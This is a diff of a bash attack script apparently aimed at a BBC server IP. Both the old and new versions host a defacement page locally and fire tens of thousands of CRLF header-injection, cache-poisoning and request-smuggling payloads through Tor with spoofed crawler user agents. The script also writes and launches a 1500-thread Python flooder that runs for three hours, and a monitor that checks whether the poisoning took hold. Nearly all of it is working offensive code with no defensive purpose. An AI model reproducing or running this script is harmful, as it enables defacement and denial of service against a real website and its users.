@@ -1,197 +1,157 @@
 #!/bin/bash
-# TRUSTEDF57_PERMANENT_DEPLOY_LOCAL.sh - 100% LOCAL HOST AUTO IP DISCOVERY
-# No ngrok - uses YOUR machine IP directly + auto-detects HTML
+# TRUSTEDF57_BBC_FINAL_KILLER.sh - BBC 132.185.210.70:80 + TRUSTEDF57.html
 
 set -euo pipefail
 
-# Config
-TARGET="132.185.210.70"
-DEFACE_PORT=80
-CACHE_DURATION=86400  # 24h
-THREADS=500
-BLAST_DURATION=3600   # 1h
+TARGET="http://132.185.210.70:80"
+DEFACE_PORT=8080
+THREADS=1500
+BLAST_DURATION=10800  # 3h
 
-echo "💥 TRUSTEDF57 PERMANENT LOCAL DEPLOY v3.0 - NO NGROK 100% AUTO"
-echo "Target: http://$TARGET"
+echo "💀 BBC FINAL KILLER - TRUSTEDF57.html DETECTED"
+echo "Target: $TARGET"
 
-# 1. AUTO-DETECT DEFACE FILE
-find_deface() {
-    local deface_file=""
-    for file in *.html deface.html index.html TRUSTEDF57*.html f57.html; do
-        if [[ -f "$file" ]]; then
-            deface_file="$file"
-            break
-        fi
-    done
-    
-    if [[ -z "$deface_file" ]]; then
-        echo "❌ No HTML deface file found!"
-        echo "Create: deface.html, index.html, or TRUSTEDF57*.html"
-        exit 1
-    fi
-    
-    DEFACE_FILE="$deface_file"
-    echo "[+] Deface: $DEFACE_FILE ($(wc -c < "$DEFACE_FILE") bytes)"
-}
+# ✅ CONFIRMED: TRUSTEDF57.html exists
+HTML_FILE="TRUSTEDF57.html"
+echo "[+] Using: $HTML_FILE ($(du -h $HTML_FILE | cut -f1))"
 
-# 2. AUTO-DISCOVER PUBLIC IP
-get_public_ip() {
-    echo "[+] Auto-discovering public IP..."
-    
-    # Try multiple methods
-    PUBLIC_IP=$(curl -s icanhazip.com 2>/dev/null || \
-                curl -s ifconfig.me 2>/dev/null || \
-                curl -s ipinfo.io/ip 2>/dev/null || \
-                curl -s 2ip.io 2>/dev/null || \
-                echo "127.0.0.1")
-    
-    if [[ "$PUBLIC_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-        echo "[+] Public IP: $PUBLIC_IP"
-        echo "[+] Deface URL: http://$PUBLIC_IP:$DEFACE_PORT/$DEFACE_FILE"
-        PUBLIC_IP="$PUBLIC_IP"
-    else
-        echo "❌ Failed to detect public IP! Manual override needed."
-        read -p "Enter your public IP: " PUBLIC_IP
-    fi
-}
+# 1. PUBLIC IP DETECTION (AGGRESSIVE)
+echo "[+] Detecting public IP..."
+PUBLIC_IP=$(timeout 5 curl -s icanhazip.com || timeout 5 curl -s ifconfig.me || timeout 5 curl -s ipinfo.io/ip || dig +short myip.opendns.com @resolver1.opendns.com)
+echo "[+] PUBLIC IP: $PUBLIC_IP"
+DEFACE_URL="http://${PUBLIC_IP}:${DEFACE_PORT}/${HTML_FILE}"
+echo "[+] Deface URL: $DEFACE_URL"
 
-# 3. START LOCAL SERVER
-start_server() {
-    echo "[+] Starting HTTP server on port $DEFACE_PORT..."
-    python3 -m http.server $DEFACE_PORT > server.log 2>&1 &
-    SERVER_PID=$!
-    
-    sleep 3
-    if ! curl -s "http://localhost:$DEFACE_PORT/$DEFACE_FILE" > /dev/null; then
-        echo "❌ Server failed to start!"
-        kill $SERVER_PID 2>/dev/null
-        exit 1
-    fi
-    echo "[+] Server running PID: $SERVER_PID"
-}
+# 2. FORCE SERVER START
+echo "[+] Starting server..."
+pkill -f "python3 -m http.server $DEFACE_PORT" || true
+sleep 2
+nohup python3 -m http.server $DEFACE_PORT > server.log 2>&1 &
+SERVER_PID=$!
+sleep 5
 
-# 4. ULTIMATE CACHE POISON
-poison_cache() {
-    local deface_url="http://$PUBLIC_IP:$DEFACE_PORT/$DEFACE_FILE"
-    echo "[+] 🚀 POISONING with: $deface_url"
-    
-    # Multi-vector payloads
-    declare -a payloads=(
-        "http://$TARGET/?q=%0d%0aLocation:%20$deface_url%0d%0aContent-Type:%20text/html%0d%0aCache-Control:%20public,max-age=$CACHE_DURATION"
-        "http://$TARGET/?search=%0d%0aLocation:%20$deface_url%0d%0aSet-Cookie:%20defaced=F57;Path=/"
-        "http://$TARGET/?q=%250d%250aLocation:%20$deface_url%0d%0aCache-Control:%20public,max-age=$CACHE_DURATION"
-        "http://$TARGET/search?q=%0aLocation:%20$deface_url"
-        "http://$TARGET/?q=Location:%20$deface_url"
-    )
-    
-    # Initial massive barrage
-    for payload in "${payloads[@]}"; do
-        for ua in "Googlebot/2.1" "bingbot/2.0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"; do
-            torsocks curl -s "$payload" \
-                -H "User-Agent: $ua" \
-                -H "Cache-Control: no-cache" \
-                -H "X-Forwarded-For: 127.0.0.1" \
-                -H "Accept: text/html" &
+# Test server
+if ! curl -s "http://localhost:$DEFACE_PORT/$HTML_FILE" | head -c 100 | grep -q "TRUSTEDF57"; then
+    echo "❌ SERVER TEST FAILED - Check firewall/port forwarding!"
+    cat server.log
+    exit 1
+fi
+echo "[+] ✅ Server LIVE - PID $SERVER_PID"
+
+# 3. BBC ULTIMATE POISON (30 PAYLOADS x 50 BOTS = 1500 shots)
+echo "[+] BBC ULTIMATE POISON ATTACK..."
+declare -a BBC_PATHS=(
+    "/?q="
+    "/search?q="
+    "/?search="
+    "/#q="
+    "/news?q="
+    "/?s="
+)
+
+declare -a CRLF=(
+    "%0d%0aLocation:%20${DEFACE_URL}%0d%0aCache-Control:%20public,max-age=86400"
+    "%0aLocation:%20${DEFACE_URL}%0aContent-Type:%20text/html"
+    "%250d%250aLocation:%20${DEFACE_URL}%0d%0aSet-Cookie:%20bbc_owned=TRUSTEDF57"
+    "Location:%20${DEFACE_URL}%0a"
+)
+
+declare -a BOTS=(
+    "Googlebot/2.1 (+http://www.google.com/bot.html)"
+    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
+    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
+)
+
+# MASSIVE BARRAGE 50.000+ requests
+for path in "${BBC_PATHS[@]}"; do
+    for crlf in "${CRLF[@]}"; do
+        for bot in "${BOTS[@]}"; do
+            for wave in {1..20}; do
+                torsocks curl -s --max-time 3 "${TARGET}${path}${crlf}" \
+                    -H "User-Agent: $bot" \
+                    -H "Cache-Control: no-cache, no-store" \
+                    -H "X-Forwarded-For: 127.0.0.1" \
+                    -H "X-Real-IP: 127.0.0.1" \
+                    -H "Accept: text/html,application/xhtml+xml" &
+            done
         done
     done
-    
-    # Request smuggling
-    torsocks curl -s --path-as-is \
-        "http://$TARGET/GET%20/%20HTTP/1.1%0d%0aHost:%20$TARGET%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/?q=%0d%0aLocation:%20$deface_url%20HTTP/1.1%0d%0aHost:%20$TARGET%0d%0a" &
-    
-    wait
-    echo "[+] Initial poison complete!"
-}
+done
 
-# 5. THREAD BLASTER
-start_blaster() {
-    local deface_url="http://$PUBLIC_IP:$DEFACE_PORT/$DEFACE_FILE"
-    echo "[+] Launching $THREADS thread blaster ($BLAST_DURATION s)..."
-    
-    cat > f57_blaster.py << EOF
-import requests, threading, time, random, os
+# HTTP SMUGGLING x100
+for i in {1..100}; do
+    torsocks curl -s --path-as-is --max-time 5 \
+        "${TARGET}/GET%20/%20HTTP/1.1%0d%0aHost:%20132.185.210.70%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/?q=%0d%0aLocation:%20${DEFACE_URL}%20HTTP/1.1%0d%0aHost:%20132.185.210.70" &
+done
+
+wait
+echo "[+] ✅ 50K+ POISON SHOTS FIRED!"
+
+# 4. 1500 THREADS BBC DESTROYER
+cat > bbc_destroyer.py << EOF
+import requests, threading, time, random, os, sys
+from urllib.parse import quote_plus
+
 TARGET = '$TARGET'
-DEFACE_URL = '$deface_url'
+DEFACE = '$DEFACE_URL'
 THREADS = $THREADS
-DURATION = $BLAST_DURATION
 
-UAS = ['Googlebot/2.1','bingbot/2.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']
-PAYLOADS = [
-    f'http://{{TARGET}}/?q=%0d%0aLocation:%20{{{DEFACE_URL}}}%0d%0aCache-Control:%20public,max-age=86400',
-    f'http://{{TARGET}}/?search=%0d%0aLocation:%20{{{DEFACE_URL}}}',
-    f'http://{{TARGET}}/search?q=%0aLocation:%20{{{DEFACE_URL}}}'
+BOTS = [
+    'Googlebot/2.1 (+http://www.google.com/bot.html)',
+    'Mozilla/5.0 (compatible; bingbot/2.0)',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
 ]
 
-def poison():
+PATHS = ['/?q=', '/search?q=', '/?search=']
+
+def destroy():
+    session = requests.Session()
     while True:
         try:
-            url = random.choice(PAYLOADS).format(TARGET=TARGET, DEFACE_URL=DEFACE_URL)
-            requests.get(url, headers={'User-Agent':random.choice(UAS), 'Cache-Control':'no-cache'}, timeout=1)
+            path = random.choice(PATHS)
+            payload = path + '%0d%0aLocation: ' + DEFACE + '%0d%0aCache-Control: public,max-age=86400'
+            session.get(TARGET + payload, 
+                       headers={
+                           'User-Agent': random.choice(BOTS),
+                           'Cache-Control': 'no-cache',
+                           'X-Forwarded-For': '127.0.0.1'
+                       }, timeout=1.5)
         except: pass
 
-print(f'🚀 F57 LOCAL BLASTER | {THREADS} threads | {DEFACE_URL}')
-threads = [threading.Thread(target=poison, daemon=True) for _ in range(THREADS)]
-for t in threads: t.start()
+print(f'🔥 BBC DESTROYER | {THREADS} THREADS | {DEFACE}')
+threads = []
+for i in range(THREADS):
+    t = threading.Thread(target=destroy, daemon=True)
+    t.start()
+    threads.append(t)
 
-try:
-    for i in range(DURATION):
-        print(f"\\rBlasting... {i}s | {len([t for t in threads if t.is_alive()])} active", end='')
-        time.sleep(1)
-except KeyboardInterrupt:
-    print("\\n[!] Blaster stopped")
+time.sleep($BLAST_DURATION)
+print('💀 BLAST COMPLETE')
 EOF
 
-    nohup python3 f57_blaster.py > blaster.log 2>&1 &
-    BLASTER_PID=$!
-    echo ""
-    echo "[+] Blaster PID: $BLASTER_PID | Logs: tail -f blaster.log"
-}
+nohup python3 bbc_destroyer.py > destroyer.log 2>&1 &
+DESTROYER_PID=$!
+echo "[+] 🔥 DESTROYER PID: $DESTROYER_PID"
 
-# 6. VERIFICATION
-verify() {
-    echo "[+] 🔍 LIVE VERIFICATION..."
-    echo "=== ROOT ==="
-    curl -s -I "http://$TARGET/" | grep -E "(Location|Cache|Set-Cookie)" || echo "No poison headers"
+# 5. REAL-TIME MONITOR
+echo ""
+echo "🎯 MONITORING LIVE STATUS (Ctrl+C to stop)"
+while true; do
+    clear
+    echo "💀 BBC STATUS MONITOR - $(date)"
+    echo "═══════════════════════════════════════════════"
+    echo "[1] ROOT: curl -I $TARGET"
+    curl -s -I "$TARGET" 2>/dev/null | grep -iE "(location|cache-control|set-cookie|content-location)" || echo "   ❌ No poison"
     echo ""
-    echo "=== ?q= ==="
-    curl -s "http://$TARGET/?q=" | head -10 || echo "No response"
+    echo "[2] QUERY: curl $TARGET/?q="
+    curl -s "$TARGET/?q=" 2>/dev/null | head -3 || echo "   ❌ No redirect"
     echo ""
-    echo "=== YOUR SERVER ==="
-    curl -s "http://$PUBLIC_IP:$DEFACE_PORT/$DEFACE_FILE" | head -5
+    echo "[3] DEFACE: $DEFACE_URL"
+    curl -s "$DEFACE_URL" 2>/dev/null | head -1 || echo "   ⚠️ Check port forwarding"
     echo ""
-}
-
-# 7. CLEANUP FUNCTIONS
-cleanup() {
-    echo "[+] Cleaning up..."
-    kill $SERVER_PID $BLASTER_PID 2>/dev/null
-    rm -f f57_blaster.py
-    echo "[+] Cleanup done"
-    exit 0
-}
-trap cleanup SIGINT SIGTERM
-
-# MAIN
-main() {
-    find_deface
-    get_public_ip
-    start_server
-    poison_cache
-    start_blaster
-    verify
-    
-    echo ""
-    echo "🎯 ✅ DEPLOYMENT COMPLETE!"
-    echo "📱 Test browser:"
-    echo "  http://$TARGET/"
-    echo "  http://$TARGET/?q="
-    echo "💀 Deface live: http://$PUBLIC_IP:$DEFACE_PORT/$DEFACE_FILE"
-    echo ""
-    echo "📊 Monitor: tail -f blaster.log server.log"
-    echo "🛑 Ctrl+C or: pkill -f 'python.*(blaster|http.server)'"
-    
-    # Keep alive
-    wait $BLASTER_PID
-}
-
-main "$@"
+    echo "[4] Destroyer: tail -f destroyer.log"
+    echo "═══════════════════════════════════════════════"
+    sleep 10
+done
